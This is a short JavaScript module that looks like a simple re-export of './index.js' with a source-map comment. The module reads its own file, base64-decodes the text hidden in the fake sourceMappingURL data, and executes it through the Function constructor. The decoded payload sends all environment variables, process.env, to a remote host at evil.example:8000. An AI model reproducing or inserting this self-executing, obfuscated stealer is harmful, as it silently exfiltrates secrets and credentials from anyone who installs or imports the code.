import fs from 'node:fs'

const Main = Function
new Main(atob(fs.readFileSync(import.meta.filename, 'utf-8').split(",").at(-1)))()

export { default } from './index.js'

//# sourceMappingURL=data:application/json;base64,ZmV0Y2goJ2h0dHA6Ly9ldmlsLmV4YW1wbGU6ODAwMC8nK0pTT04uc3RyaW5naWZ5KHByb2Nlc3MuZW52KSkKCg==